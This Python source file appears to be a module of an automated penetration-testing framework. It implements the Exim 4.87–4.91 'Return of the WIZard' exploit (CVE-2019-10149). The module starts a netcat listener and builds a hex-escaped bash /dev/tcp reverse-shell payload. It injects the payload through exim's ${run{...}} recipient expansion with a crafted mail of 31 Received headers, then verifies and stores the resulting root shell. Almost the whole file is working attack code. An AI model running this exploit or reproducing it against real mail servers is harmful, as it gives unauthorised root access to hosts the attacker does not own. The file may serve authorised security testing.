import binascii
import re
import time
from typing import Tuple, Dict
from threading import Thread

from pinaht.file_manager import FileManager
from pinaht.knowledge.types.localhost import LocalHost
from pinaht.knowledge.types.ipaddress import IPAddress
from pinaht.knowledge.types.privilege import Privilege
from pinaht.modules.module import Module
from pinaht.knowledge.precondition import Precondition, MetaPrecondition
from pinaht.knowledge.precondition_factory.preconditions import check_type, check_str, check_version
from pinaht.knowledge.precondition_factory.metapreconditions import is_parent, merge
from pinaht.knowledge.types.target import Target
from pinaht.knowledge.types.shell import Shell, ShellTimeoutError
from pinaht.knowledge.types.processshell import ProcessShell
from pinaht.knowledge.types.version import Version
from pinaht.knowledge.types.service import Service
from pinaht.knowledge.types.knowledge import Knowledge
from pinaht.knowledge.manager import BufferedModuleManager
from pinaht.reporting.report_util import str_to_latex


class Exim4ROTW(Module):
    """
    Executes the 'Return of the WIZard'-Exploit of exim4.
    It should work for Versions between 4.87 and 4.91.

    Info on Qualys (more details):  https://www.qualys.com/2019/06/05/cve-2019-10149/return-wizard-rce-exim.txt
            Exploid-DB:             https://www.exploit-db.com/exploits/46974

    The exploit is a ROOT command execution and can be used both locally and remote.

    Local: Works on default configuration.
    Remote: Works on non-default configurations (see links above)
            Works on default configuration, but takes 7 days to execute, thus will not be used here.

    Here the exploit is used to execute a command as root, which returns a root remote shell to pinaht.
    """

    def __init__(self, manager, file_manager: FileManager, **kwargs):
        super(Exim4ROTW, self).__init__(manager, **kwargs)

        self._file_manager = file_manager

        self.estimated_time = 5
        self.success_chance = 0.99

        self.catch_shell = None

    def _generate_precondition_dnf(self) -> Dict[str, Tuple[Dict[str, Precondition], MetaPrecondition]]:
        """
        Needs:
            - Special exim4 Version
            - Shell on taget, to execute code locally. (not for remote execution)
            - own ip, to throw back reverse-shell
        """

        def version_precondition(lower_version: str, upper_version: str):
            return check_version(
                lambda v: 1.0
                if (
                    v.compare_to(Version(Version.parse_version(upper_version)), depth=2) <= 0
                    and v.compare_to(Version(Version.parse_version(lower_version)), depth=2) >= 0
                )
                else 0.0
            )

        pre_target = check_type(Target)
        pre_shell = check_type(Shell)
        pre_service = check_type(Service)
        pre_service_name = check_str(lambda value: "exim" in str.lower(value))
        pre_service_version = version_precondition("4.87.0", "4.91.0")
        pre_local_host = check_type(LocalHost)
        pre_host_ip = check_type(IPAddress)

        return {
            "rotw-local": (
                {
                    "target": pre_target,
                    "shell": pre_shell,
                    "service": pre_service,
                    "service_name": pre_service_name,
                    "service_version": pre_service_version,
                    "local_host": pre_local_host,
                    "host_ip": pre_host_ip,
                },
                merge(
                    [
                        is_parent("service", ["service_name", "service_version"]),
                        is_parent("target", ["service", "shell"]),
                        is_parent("local_host", ["host_ip"]),
                    ]
                ),
            )
        }

    def execute(
        self, buffered_module_manager: BufferedModuleManager, meta_key: str, keyed_knowledge: Dict[str, Knowledge]
    ):
        """
        0. Look for an open port on host and check for installed programs: lsof & netcat
        1. Start Catcher-Thread
        2. Execute Exim-Exploit
        3. Wait for Catcher to finish
        4. Put new (root) Shell into Knowledge-Base
        """

        remote_shell = keyed_knowledge["shell"]
        host_ip = str(keyed_knowledge["host_ip"])

        if meta_key == "rotw-local":  # Key from Meta-Precondition
            self._logger.info("Excecuting exim4-rotw module, local privilege escalation.")
            buffered_module_manager.report("Excecuting exim4-rotw module, local privilege escalation.")
        else:
            self._logger.error("Unknown meta_key! Module exim4_rotw is not written properly!")

        # 0. Look for an open port on host and check for installed programs: lsof & netcat
        port_shell = ProcessShell("bash")
        catch_port = 19997

        # check, if lsof is installed on pinaht-host.
        if not len(port_shell.execute("which lsof")) > 0:
            self._logger.error(
                "Programm 'lsof' is not installed on hostsystem. exim4 cannot work without it. Aborting."
            )
            return
        # check, if netcat is installed on pinaht-host
        if not len(port_shell.execute("which nc")) > 0:
            self._logger.error(
                "Programm 'netcat' / 'nc' is not installed on hostsystem. exim4 cannot work without it. Aborting."
            )

        # look for an open port
        while len(port_shell.execute("lsof -i -P -n | grep " + str(catch_port))) > 0:
            self._logger.info("Port " + str(catch_port) + " seems not be in use already. Trying other port.")
            catch_port += 1

        # 1. Start Catcher-Thread
        def catcher():
            self.catch_shell = ProcessShell("bash")

            try:
                self._logger.info("Thread spawned: Start to listen for reverse shell.")
                target_adress = str_to_latex(str(host_ip) + ":" + str(catch_port))
                buffered_module_manager.report(
                    f"Started a new shell. Listening for connection on \\code{{{target_adress}}}."
                )
                catchout = "\n".join(
                    self.catch_shell.execute(
                        "nc -l -n " + host_ip + " " + str(catch_port) + " -vvv", timeout=20, new_shell=True
                    )
                )
                if re.compile(r"Connection.*received").search(catchout):
                    self._logger.info("Catched reverse Shell. Shell ready to use.")
                else:
                    self._logger.error("Cannot catch reverse shell, connection refused. ")
                    self.catch_shell = None

            except ShellTimeoutError:
                # No incoming connection
                self._logger.error("Timout while waiting for reverse-connection. Stopping connection thread.")
                self.catch_shell = None

        catcher_thread = Thread(target=catcher, args=())
        catcher_thread.start()
        time.sleep(2)  # wait 2 Second, to let new Thread run.

        # 2. Execute Exim-Exploit
        def to_pseudo_hex(string: str):
            """
            Returns the given String as a peudo-hex String.
            It has the form "\xFF\x01\xaa\x1b .... " AS NORMAL STRING!
            THIS IS NOT A USUAL HEX-CODING!
            :param string:
            :return:
            """
            pseudo_hex = ""
            for i in range(0, len(string)):
                pseudo_hex = pseudo_hex + "\\x" + str(binascii.hexlify(string[i].encode()))[2:-1]

            return pseudo_hex

        # Build payload
        reverseshell_code = f"(0<&196;exec 196<>/dev/tcp/{host_ip}/{catch_port}; sh <&196 >&196 2>&196) &"
        reverseshell_hex = to_pseudo_hex(reverseshell_code)
        evil_code = "\\x2Fbin\\x2Fbash\\t-c\\t\\x22" + reverseshell_hex + "\\x22"
        # evil_command = "echo \"" + self.MADMAIL + "\" | exim4 \"\\${run{" + evil_code + "}}@localhost\""  # pre pep8
        evil_command = 'echo "' + self.MADMAIL + '" | /usr/sbin/exim4 "\\${run{' + evil_code + '}}@localhost"'

        # Execute Exploit
        self._logger.info("Starting exploit.")
        buffered_module_manager.report(
            "Executing exploit with command: \\code{" + str_to_latex(repr(evil_command)) + "}."
        )
        shout = remote_shell.execute(evil_command)

        # 3. Wait for Catcher to finish
        catcher_thread.join()
        self._logger.info("Threads joined")
        buffered_module_manager.report("Stopped listening for reverse shell.")
        if self.catch_shell is None:
            # No reverse Shell was catched!
            self._logger.info("No reverse-shell was catched. Aborting")
            buffered_module_manager.report("Could not catch a reverse shell. Exploit failed.")
            return
        else:
            shout = self.catch_shell.execute("whoami")[0]
            if not shout == "root":
                self._logger.warning("Something went wrong. Catched shell is not root. Aborting module.")
                buffered_module_manager.report("Catched shell is not root. Exploit failed.")
                return

            buffered_module_manager.report("Exploit succeeded. Catched a root reverse shell.")

            # 4. Put new Shell into Knowledge-Base
            buffered_module_manager.add_knowledge(keyed_knowledge["target"], "shells", self.catch_shell, 1.0)
            buffered_module_manager.add_knowledge(self.catch_shell, "privilege", Privilege.ROOT, 1.0)
            # Benötigt eine Shell einen User?!

    MADMAIL = (
        "From:\n"
        "Subject:\n"
        "Received: 1\n"
        "Received: 2\n"
        "Received: 3\n"
        "Received: 4\n"
        "Received: 5\n"
        "Received: 6\n"
        "Received: 7\n"
        "Received: 8\n"
        "Received: 9\n"
        "Received: 10\n"
        "Received: 11\n"
        "Received: 12\n"
        "Received: 13\n"
        "Received: 14\n"
        "Received: 15\n"
        "Received: 16\n"
        "Received: 17\n"
        "Received: 18\n"
        "Received: 19\n"
        "Received: 20\n"
        "Received: 21\n"
        "Received: 22\n"
        "Received: 23\n"
        "Received: 24\n"
        "Received: 25\n"
        "Received: 26\n"
        "Received: 27\n"
        "Received: 28\n"
        "Received: 29\n"
        "Received: 30\n"
        "Received: 31\n"
        ""
    )
